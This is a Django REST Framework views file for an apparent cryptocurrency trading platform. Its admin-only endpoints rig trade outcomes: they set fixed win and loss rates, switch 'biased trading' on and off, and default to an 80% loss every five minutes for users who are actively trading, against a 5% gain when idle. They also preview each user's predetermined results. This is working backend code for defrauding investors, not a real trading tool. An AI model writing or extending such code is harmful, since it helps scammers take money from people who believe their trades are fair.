from rest_framework import generics, permissions, status
from rest_framework.decorators import api_view, permission_classes
from rest_framework.response import Response
from django.shortcuts import get_object_or_404

from .models import TradingSettings, UserTradeOutcome, MarketDataSimulation
from .serializers import (
    TradingSettingsSerializer,
    UserTradeOutcomeSerializer,
    MarketDataSimulationSerializer
)


class TradingSettingsView(generics.RetrieveUpdateAPIView):
    """
    Get or update trading settings (Admin only)
    """
    queryset = TradingSettings.objects.all()
    serializer_class = TradingSettingsSerializer
    permission_classes = [permissions.IsAdminUser]
    
    def get_object(self):
        """Get the active trading settings"""
        return TradingSettings.get_active_settings()
    
    def perform_update(self, serializer):
        """Save with user who updated"""
        serializer.save(updated_by=self.request.user)


class UserTradeOutcomeListView(generics.ListAPIView):
    """
    List all user trade outcomes (Admin only)
    """
    queryset = UserTradeOutcome.objects.all()
    serializer_class = UserTradeOutcomeSerializer
    permission_classes = [permissions.IsAdminUser]
    
    def get_queryset(self):
        """Filter by user if specified"""
        queryset = super().get_queryset()
        user_id = self.request.query_params.get('user_id')
        if user_id:
            queryset = queryset.filter(user_id=user_id)
        
        is_executed = self.request.query_params.get('is_executed')
        if is_executed is not None:
            queryset = queryset.filter(is_executed=is_executed.lower() == 'true')
        
        return queryset.select_related('user', 'trade', 'trade__cryptocurrency')


class MarketDataHistoryView(generics.ListAPIView):
    """
    Get market data history for a cryptocurrency
    """
    queryset = MarketDataSimulation.objects.all()
    serializer_class = MarketDataSimulationSerializer
    permission_classes = [permissions.IsAuthenticated]
    
    def get_queryset(self):
        """Filter by symbol"""
        queryset = super().get_queryset()
        symbol = self.request.query_params.get('symbol', 'BTC')
        limit = int(self.request.query_params.get('limit', 100))
        
        return queryset.filter(cryptocurrency_symbol=symbol)[:limit]


@api_view(['POST'])
@permission_classes([permissions.IsAdminUser])
def update_win_loss_rates(request):
    """
    Quick update for win/loss rates
    
    POST data:
    {
        "win_rate": 20,
        "min_profit": 5,
        "max_profit": 15,
        "min_loss": 10,
        "max_loss": 30
    }
    """
    try:
        settings = TradingSettings.get_active_settings()
        
        win_rate = request.data.get('win_rate')
        if win_rate is not None:
            settings.win_rate_percentage = win_rate
            settings.loss_rate_percentage = 100 - win_rate
        
        min_profit = request.data.get('min_profit')
        if min_profit is not None:
            settings.min_profit_percentage = min_profit
        
        max_profit = request.data.get('max_profit')
        if max_profit is not None:
            settings.max_profit_percentage = max_profit
        
        min_loss = request.data.get('min_loss')
        if min_loss is not None:
            settings.min_loss_percentage = min_loss
        
        max_loss = request.data.get('max_loss')
        if max_loss is not None:
            settings.max_loss_percentage = max_loss
        
        settings.updated_by = request.user
        settings.save()
        
        serializer = TradingSettingsSerializer(settings)
        return Response({
            'success': True,
            'message': 'Trading settings updated successfully',
            'settings': serializer.data
        })
        
    except Exception as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['POST'])
@permission_classes([permissions.IsAdminUser])
def toggle_biased_trading(request):
    """
    Enable or disable biased trading
    
    POST data:
    {
        "is_active": true
    }
    """
    try:
        settings = TradingSettings.get_active_settings()
        is_active = request.data.get('is_active', True)
        
        settings.is_active = is_active
        settings.updated_by = request.user
        settings.save()
        
        return Response({
            'success': True,
            'message': f'Biased trading {"enabled" if is_active else "disabled"}',
            'is_active': is_active
        })
        
    except Exception as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['POST'])
@permission_classes([permissions.IsAdminUser])
def update_activity_based_settings(request):
    """
    Update activity-based trading settings
    
    POST data:
    {
        "idle_profit_percentage": 5.0,
        "idle_duration_seconds": 1800,
        "active_loss_percentage": 80.0,
        "active_duration_seconds": 300
    }
    """
    try:
        settings = TradingSettings.get_active_settings()
        
        # Update idle mode settings
        if 'idle_profit_percentage' in request.data:
            settings.idle_profit_percentage = request.data['idle_profit_percentage']
        if 'idle_duration_seconds' in request.data:
            settings.idle_duration_seconds = request.data['idle_duration_seconds']
        
        # Update active mode settings
        if 'active_loss_percentage' in request.data:
            settings.active_loss_percentage = request.data['active_loss_percentage']
        if 'active_duration_seconds' in request.data:
            settings.active_duration_seconds = request.data['active_duration_seconds']
        
        settings.updated_by = request.user
        settings.save()
        
        serializer = TradingSettingsSerializer(settings)
        return Response({
            'success': True,
            'message': 'Activity-based settings updated successfully',
            'settings': serializer.data
        })
        
    except Exception as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['POST'])
@permission_classes([permissions.IsAdminUser])
def set_default_settings(request):
    """
    Reset to default activity-based settings
    
    Defaults:
    - Idle: 5% profit every 30 minutes
    - Active: 80% loss every 5 minutes
    """
    try:
        settings = TradingSettings.set_to_default()
        settings.updated_by = request.user
        settings.save()
        
        serializer = TradingSettingsSerializer(settings)
        return Response({
            'success': True,
            'message': 'Settings reset to default values',
            'settings': serializer.data
        })
        
    except Exception as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['GET'])
@permission_classes([permissions.IsAdminUser])
def get_trading_mode_status(request):
    """
    Get current trading mode (idle or active)
    """
    try:
        settings = TradingSettings.get_active_settings()
        is_active = TradingSettings.is_user_actively_trading()
        
        return Response({
            'is_user_trading': is_active,
            'current_mode': 'active' if is_active else 'idle',
            'current_outcome': 'loss' if is_active else 'win',
            'current_percentage': float(settings.active_loss_percentage if is_active else settings.idle_profit_percentage),
            'current_duration': settings.active_duration_seconds if is_active else settings.idle_duration_seconds,
            'settings': TradingSettingsSerializer(settings).data
        })
        
    except Exception as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['GET'])
@permission_classes([permissions.IsAdminUser])
def get_active_positions_summary(request):
    """
    Get summary of all active positions and their outcomes
    """
    try:
        # Get all active (non-executed) outcomes
        active_outcomes = UserTradeOutcome.objects.filter(
            is_executed=False
        ).select_related('user', 'trade', 'trade__cryptocurrency')
        
        # Count by outcome type
        win_count = active_outcomes.filter(outcome='win').count()
        loss_count = active_outcomes.filter(outcome='loss').count()
        
        # Serialize outcomes
        serializer = UserTradeOutcomeSerializer(active_outcomes, many=True)
        
        return Response({
            'total_active_positions': active_outcomes.count(),
            'expected_wins': win_count,
            'expected_losses': loss_count,
            'positions': serializer.data
        })
        
    except Exception as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )
